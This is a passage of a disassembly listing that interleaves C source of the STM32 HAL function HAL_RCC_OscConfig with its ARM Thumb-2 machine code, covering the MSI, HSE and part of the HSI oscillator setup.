    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80038e2:	69bb      	ldr	r3, [r7, #24]
 80038e4:	2b00      	cmp	r3, #0
 80038e6:	d007      	beq.n	80038f8 <HAL_RCC_OscConfig+0x4c>
 80038e8:	69bb      	ldr	r3, [r7, #24]
 80038ea:	2b0c      	cmp	r3, #12
 80038ec:	f040 808b 	bne.w	8003a06 <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 80038f0:	697b      	ldr	r3, [r7, #20]
 80038f2:	2b01      	cmp	r3, #1
 80038f4:	f040 8087 	bne.w	8003a06 <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 80038f8:	4b88      	ldr	r3, [pc, #544]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80038fa:	681b      	ldr	r3, [r3, #0]
 80038fc:	f003 0302 	and.w	r3, r3, #2
 8003900:	2b00      	cmp	r3, #0
 8003902:	d005      	beq.n	8003910 <HAL_RCC_OscConfig+0x64>
 8003904:	687b      	ldr	r3, [r7, #4]
 8003906:	699b      	ldr	r3, [r3, #24]
 8003908:	2b00      	cmp	r3, #0
 800390a:	d101      	bne.n	8003910 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 800390c:	2301      	movs	r3, #1
 800390e:	e3d9      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003910:	687b      	ldr	r3, [r7, #4]
 8003912:	6a1a      	ldr	r2, [r3, #32]
 8003914:	4b81      	ldr	r3, [pc, #516]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003916:	681b      	ldr	r3, [r3, #0]
 8003918:	f003 0308 	and.w	r3, r3, #8
 800391c:	2b00      	cmp	r3, #0
 800391e:	d004      	beq.n	800392a <HAL_RCC_OscConfig+0x7e>
 8003920:	4b7e      	ldr	r3, [pc, #504]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003922:	681b      	ldr	r3, [r3, #0]
 8003924:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003928:	e005      	b.n	8003936 <HAL_RCC_OscConfig+0x8a>
 800392a:	4b7c      	ldr	r3, [pc, #496]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 800392c:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003930:	091b      	lsrs	r3, r3, #4
 8003932:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003936:	4293      	cmp	r3, r2
 8003938:	d223      	bcs.n	8003982 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800393a:	687b      	ldr	r3, [r7, #4]
 800393c:	6a1b      	ldr	r3, [r3, #32]
 800393e:	4618      	mov	r0, r3
 8003940:	f000 fd8c 	bl	800445c <RCC_SetFlashLatencyFromMSIRange>
 8003944:	4603      	mov	r3, r0
 8003946:	2b00      	cmp	r3, #0
 8003948:	d001      	beq.n	800394e <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 800394a:	2301      	movs	r3, #1
 800394c:	e3ba      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 800394e:	4b73      	ldr	r3, [pc, #460]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003950:	681b      	ldr	r3, [r3, #0]
 8003952:	4a72      	ldr	r2, [pc, #456]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003954:	f043 0308 	orr.w	r3, r3, #8
 8003958:	6013      	str	r3, [r2, #0]
 800395a:	4b70      	ldr	r3, [pc, #448]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 800395c:	681b      	ldr	r3, [r3, #0]
 800395e:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003962:	687b      	ldr	r3, [r7, #4]
 8003964:	6a1b      	ldr	r3, [r3, #32]
 8003966:	496d      	ldr	r1, [pc, #436]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003968:	4313      	orrs	r3, r2
 800396a:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 800396c:	4b6b      	ldr	r3, [pc, #428]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 800396e:	685b      	ldr	r3, [r3, #4]
 8003970:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003974:	687b      	ldr	r3, [r7, #4]
 8003976:	69db      	ldr	r3, [r3, #28]
 8003978:	021b      	lsls	r3, r3, #8
 800397a:	4968      	ldr	r1, [pc, #416]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 800397c:	4313      	orrs	r3, r2
 800397e:	604b      	str	r3, [r1, #4]
 8003980:	e025      	b.n	80039ce <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003982:	4b66      	ldr	r3, [pc, #408]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003984:	681b      	ldr	r3, [r3, #0]
 8003986:	4a65      	ldr	r2, [pc, #404]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003988:	f043 0308 	orr.w	r3, r3, #8
 800398c:	6013      	str	r3, [r2, #0]
 800398e:	4b63      	ldr	r3, [pc, #396]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003990:	681b      	ldr	r3, [r3, #0]
 8003992:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003996:	687b      	ldr	r3, [r7, #4]
 8003998:	6a1b      	ldr	r3, [r3, #32]
 800399a:	4960      	ldr	r1, [pc, #384]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 800399c:	4313      	orrs	r3, r2
 800399e:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80039a0:	4b5e      	ldr	r3, [pc, #376]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80039a2:	685b      	ldr	r3, [r3, #4]
 80039a4:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80039a8:	687b      	ldr	r3, [r7, #4]
 80039aa:	69db      	ldr	r3, [r3, #28]
 80039ac:	021b      	lsls	r3, r3, #8
 80039ae:	495b      	ldr	r1, [pc, #364]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80039b0:	4313      	orrs	r3, r2
 80039b2:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 80039b4:	69bb      	ldr	r3, [r7, #24]
 80039b6:	2b00      	cmp	r3, #0
 80039b8:	d109      	bne.n	80039ce <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 80039ba:	687b      	ldr	r3, [r7, #4]
 80039bc:	6a1b      	ldr	r3, [r3, #32]
 80039be:	4618      	mov	r0, r3
 80039c0:	f000 fd4c 	bl	800445c <RCC_SetFlashLatencyFromMSIRange>
 80039c4:	4603      	mov	r3, r0
 80039c6:	2b00      	cmp	r3, #0
 80039c8:	d001      	beq.n	80039ce <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 80039ca:	2301      	movs	r3, #1
 80039cc:	e37a      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80039ce:	f000 fc81 	bl	80042d4 <HAL_RCC_GetSysClockFreq>
 80039d2:	4602      	mov	r2, r0
 80039d4:	4b51      	ldr	r3, [pc, #324]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 80039d6:	689b      	ldr	r3, [r3, #8]
 80039d8:	091b      	lsrs	r3, r3, #4
 80039da:	f003 030f 	and.w	r3, r3, #15
 80039de:	4950      	ldr	r1, [pc, #320]	; (8003b20 <HAL_RCC_OscConfig+0x274>)
 80039e0:	5ccb      	ldrb	r3, [r1, r3]
 80039e2:	f003 031f 	and.w	r3, r3, #31
 80039e6:	fa22 f303 	lsr.w	r3, r2, r3
 80039ea:	4a4e      	ldr	r2, [pc, #312]	; (8003b24 <HAL_RCC_OscConfig+0x278>)
 80039ec:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 80039ee:	4b4e      	ldr	r3, [pc, #312]	; (8003b28 <HAL_RCC_OscConfig+0x27c>)
 80039f0:	681b      	ldr	r3, [r3, #0]
 80039f2:	4618      	mov	r0, r3
 80039f4:	f7fd fb86 	bl	8001104 <HAL_InitTick>
 80039f8:	4603      	mov	r3, r0
 80039fa:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 80039fc:	7bfb      	ldrb	r3, [r7, #15]
 80039fe:	2b00      	cmp	r3, #0
 8003a00:	d052      	beq.n	8003aa8 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003a02:	7bfb      	ldrb	r3, [r7, #15]
 8003a04:	e35e      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003a06:	687b      	ldr	r3, [r7, #4]
 8003a08:	699b      	ldr	r3, [r3, #24]
 8003a0a:	2b00      	cmp	r3, #0
 8003a0c:	d032      	beq.n	8003a74 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003a0e:	4b43      	ldr	r3, [pc, #268]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a10:	681b      	ldr	r3, [r3, #0]
 8003a12:	4a42      	ldr	r2, [pc, #264]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a14:	f043 0301 	orr.w	r3, r3, #1
 8003a18:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a1a:	f7fd fbc3 	bl	80011a4 <HAL_GetTick>
 8003a1e:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a20:	e008      	b.n	8003a34 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a22:	f7fd fbbf 	bl	80011a4 <HAL_GetTick>
 8003a26:	4602      	mov	r2, r0
 8003a28:	693b      	ldr	r3, [r7, #16]
 8003a2a:	1ad3      	subs	r3, r2, r3
 8003a2c:	2b02      	cmp	r3, #2
 8003a2e:	d901      	bls.n	8003a34 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a30:	2303      	movs	r3, #3
 8003a32:	e347      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a34:	4b39      	ldr	r3, [pc, #228]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a36:	681b      	ldr	r3, [r3, #0]
 8003a38:	f003 0302 	and.w	r3, r3, #2
 8003a3c:	2b00      	cmp	r3, #0
 8003a3e:	d0f0      	beq.n	8003a22 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003a40:	4b36      	ldr	r3, [pc, #216]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a42:	681b      	ldr	r3, [r3, #0]
 8003a44:	4a35      	ldr	r2, [pc, #212]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a46:	f043 0308 	orr.w	r3, r3, #8
 8003a4a:	6013      	str	r3, [r2, #0]
 8003a4c:	4b33      	ldr	r3, [pc, #204]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a4e:	681b      	ldr	r3, [r3, #0]
 8003a50:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003a54:	687b      	ldr	r3, [r7, #4]
 8003a56:	6a1b      	ldr	r3, [r3, #32]
 8003a58:	4930      	ldr	r1, [pc, #192]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a5a:	4313      	orrs	r3, r2
 8003a5c:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a5e:	4b2f      	ldr	r3, [pc, #188]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a60:	685b      	ldr	r3, [r3, #4]
 8003a62:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a66:	687b      	ldr	r3, [r7, #4]
 8003a68:	69db      	ldr	r3, [r3, #28]
 8003a6a:	021b      	lsls	r3, r3, #8
 8003a6c:	492b      	ldr	r1, [pc, #172]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a6e:	4313      	orrs	r3, r2
 8003a70:	604b      	str	r3, [r1, #4]
 8003a72:	e01a      	b.n	8003aaa <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003a74:	4b29      	ldr	r3, [pc, #164]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a76:	681b      	ldr	r3, [r3, #0]
 8003a78:	4a28      	ldr	r2, [pc, #160]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a7a:	f023 0301 	bic.w	r3, r3, #1
 8003a7e:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a80:	f7fd fb90 	bl	80011a4 <HAL_GetTick>
 8003a84:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a86:	e008      	b.n	8003a9a <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a88:	f7fd fb8c 	bl	80011a4 <HAL_GetTick>
 8003a8c:	4602      	mov	r2, r0
 8003a8e:	693b      	ldr	r3, [r7, #16]
 8003a90:	1ad3      	subs	r3, r2, r3
 8003a92:	2b02      	cmp	r3, #2
 8003a94:	d901      	bls.n	8003a9a <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003a96:	2303      	movs	r3, #3
 8003a98:	e314      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a9a:	4b20      	ldr	r3, [pc, #128]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003a9c:	681b      	ldr	r3, [r3, #0]
 8003a9e:	f003 0302 	and.w	r3, r3, #2
 8003aa2:	2b00      	cmp	r3, #0
 8003aa4:	d1f0      	bne.n	8003a88 <HAL_RCC_OscConfig+0x1dc>
 8003aa6:	e000      	b.n	8003aaa <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003aa8:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003aaa:	687b      	ldr	r3, [r7, #4]
 8003aac:	681b      	ldr	r3, [r3, #0]
 8003aae:	f003 0301 	and.w	r3, r3, #1
 8003ab2:	2b00      	cmp	r3, #0
 8003ab4:	d073      	beq.n	8003b9e <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003ab6:	69bb      	ldr	r3, [r7, #24]
 8003ab8:	2b08      	cmp	r3, #8
 8003aba:	d005      	beq.n	8003ac8 <HAL_RCC_OscConfig+0x21c>
 8003abc:	69bb      	ldr	r3, [r7, #24]
 8003abe:	2b0c      	cmp	r3, #12
 8003ac0:	d10e      	bne.n	8003ae0 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003ac2:	697b      	ldr	r3, [r7, #20]
 8003ac4:	2b03      	cmp	r3, #3
 8003ac6:	d10b      	bne.n	8003ae0 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003ac8:	4b14      	ldr	r3, [pc, #80]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003aca:	681b      	ldr	r3, [r3, #0]
 8003acc:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003ad0:	2b00      	cmp	r3, #0
 8003ad2:	d063      	beq.n	8003b9c <HAL_RCC_OscConfig+0x2f0>
 8003ad4:	687b      	ldr	r3, [r7, #4]
 8003ad6:	685b      	ldr	r3, [r3, #4]
 8003ad8:	2b00      	cmp	r3, #0
 8003ada:	d15f      	bne.n	8003b9c <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003adc:	2301      	movs	r3, #1
 8003ade:	e2f1      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003ae0:	687b      	ldr	r3, [r7, #4]
 8003ae2:	685b      	ldr	r3, [r3, #4]
 8003ae4:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003ae8:	d106      	bne.n	8003af8 <HAL_RCC_OscConfig+0x24c>
 8003aea:	4b0c      	ldr	r3, [pc, #48]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003aec:	681b      	ldr	r3, [r3, #0]
 8003aee:	4a0b      	ldr	r2, [pc, #44]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003af0:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003af4:	6013      	str	r3, [r2, #0]
 8003af6:	e025      	b.n	8003b44 <HAL_RCC_OscConfig+0x298>
 8003af8:	687b      	ldr	r3, [r7, #4]
 8003afa:	685b      	ldr	r3, [r3, #4]
 8003afc:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003b00:	d114      	bne.n	8003b2c <HAL_RCC_OscConfig+0x280>
 8003b02:	4b06      	ldr	r3, [pc, #24]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003b04:	681b      	ldr	r3, [r3, #0]
 8003b06:	4a05      	ldr	r2, [pc, #20]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003b08:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003b0c:	6013      	str	r3, [r2, #0]
 8003b0e:	4b03      	ldr	r3, [pc, #12]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003b10:	681b      	ldr	r3, [r3, #0]
 8003b12:	4a02      	ldr	r2, [pc, #8]	; (8003b1c <HAL_RCC_OscConfig+0x270>)
 8003b14:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b18:	6013      	str	r3, [r2, #0]
 8003b1a:	e013      	b.n	8003b44 <HAL_RCC_OscConfig+0x298>
 8003b1c:	40021000 	.word	0x40021000
 8003b20:	0800d21c 	.word	0x0800d21c
 8003b24:	20000000 	.word	0x20000000
 8003b28:	20000004 	.word	0x20000004
 8003b2c:	4ba0      	ldr	r3, [pc, #640]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b2e:	681b      	ldr	r3, [r3, #0]
 8003b30:	4a9f      	ldr	r2, [pc, #636]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b32:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b36:	6013      	str	r3, [r2, #0]
 8003b38:	4b9d      	ldr	r3, [pc, #628]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b3a:	681b      	ldr	r3, [r3, #0]
 8003b3c:	4a9c      	ldr	r2, [pc, #624]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b3e:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003b42:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003b44:	687b      	ldr	r3, [r7, #4]
 8003b46:	685b      	ldr	r3, [r3, #4]
 8003b48:	2b00      	cmp	r3, #0
 8003b4a:	d013      	beq.n	8003b74 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b4c:	f7fd fb2a 	bl	80011a4 <HAL_GetTick>
 8003b50:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b52:	e008      	b.n	8003b66 <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b54:	f7fd fb26 	bl	80011a4 <HAL_GetTick>
 8003b58:	4602      	mov	r2, r0
 8003b5a:	693b      	ldr	r3, [r7, #16]
 8003b5c:	1ad3      	subs	r3, r2, r3
 8003b5e:	2b64      	cmp	r3, #100	; 0x64
 8003b60:	d901      	bls.n	8003b66 <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003b62:	2303      	movs	r3, #3
 8003b64:	e2ae      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b66:	4b92      	ldr	r3, [pc, #584]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b68:	681b      	ldr	r3, [r3, #0]
 8003b6a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b6e:	2b00      	cmp	r3, #0
 8003b70:	d0f0      	beq.n	8003b54 <HAL_RCC_OscConfig+0x2a8>
 8003b72:	e014      	b.n	8003b9e <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b74:	f7fd fb16 	bl	80011a4 <HAL_GetTick>
 8003b78:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b7a:	e008      	b.n	8003b8e <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b7c:	f7fd fb12 	bl	80011a4 <HAL_GetTick>
 8003b80:	4602      	mov	r2, r0
 8003b82:	693b      	ldr	r3, [r7, #16]
 8003b84:	1ad3      	subs	r3, r2, r3
 8003b86:	2b64      	cmp	r3, #100	; 0x64
 8003b88:	d901      	bls.n	8003b8e <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003b8a:	2303      	movs	r3, #3
 8003b8c:	e29a      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b8e:	4b88      	ldr	r3, [pc, #544]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003b90:	681b      	ldr	r3, [r3, #0]
 8003b92:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b96:	2b00      	cmp	r3, #0
 8003b98:	d1f0      	bne.n	8003b7c <HAL_RCC_OscConfig+0x2d0>
 8003b9a:	e000      	b.n	8003b9e <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003b9c:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003b9e:	687b      	ldr	r3, [r7, #4]
 8003ba0:	681b      	ldr	r3, [r3, #0]
 8003ba2:	f003 0302 	and.w	r3, r3, #2
 8003ba6:	2b00      	cmp	r3, #0
 8003ba8:	d060      	beq.n	8003c6c <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003baa:	69bb      	ldr	r3, [r7, #24]
 8003bac:	2b04      	cmp	r3, #4
 8003bae:	d005      	beq.n	8003bbc <HAL_RCC_OscConfig+0x310>
 8003bb0:	69bb      	ldr	r3, [r7, #24]
 8003bb2:	2b0c      	cmp	r3, #12
 8003bb4:	d119      	bne.n	8003bea <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003bb6:	697b      	ldr	r3, [r7, #20]
 8003bb8:	2b02      	cmp	r3, #2
 8003bba:	d116      	bne.n	8003bea <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003bbc:	4b7c      	ldr	r3, [pc, #496]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003bbe:	681b      	ldr	r3, [r3, #0]
 8003bc0:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003bc4:	2b00      	cmp	r3, #0
 8003bc6:	d005      	beq.n	8003bd4 <HAL_RCC_OscConfig+0x328>
 8003bc8:	687b      	ldr	r3, [r7, #4]
 8003bca:	68db      	ldr	r3, [r3, #12]
 8003bcc:	2b00      	cmp	r3, #0
 8003bce:	d101      	bne.n	8003bd4 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003bd0:	2301      	movs	r3, #1
 8003bd2:	e277      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003bd4:	4b76      	ldr	r3, [pc, #472]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003bd6:	685b      	ldr	r3, [r3, #4]
 8003bd8:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003bdc:	687b      	ldr	r3, [r7, #4]
 8003bde:	691b      	ldr	r3, [r3, #16]
 8003be0:	061b      	lsls	r3, r3, #24
 8003be2:	4973      	ldr	r1, [pc, #460]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003be4:	4313      	orrs	r3, r2
 8003be6:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003be8:	e040      	b.n	8003c6c <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003bea:	687b      	ldr	r3, [r7, #4]
 8003bec:	68db      	ldr	r3, [r3, #12]
 8003bee:	2b00      	cmp	r3, #0
 8003bf0:	d023      	beq.n	8003c3a <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003bf2:	4b6f      	ldr	r3, [pc, #444]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003bf4:	681b      	ldr	r3, [r3, #0]
 8003bf6:	4a6e      	ldr	r2, [pc, #440]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003bf8:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003bfc:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bfe:	f7fd fad1 	bl	80011a4 <HAL_GetTick>
 8003c02:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
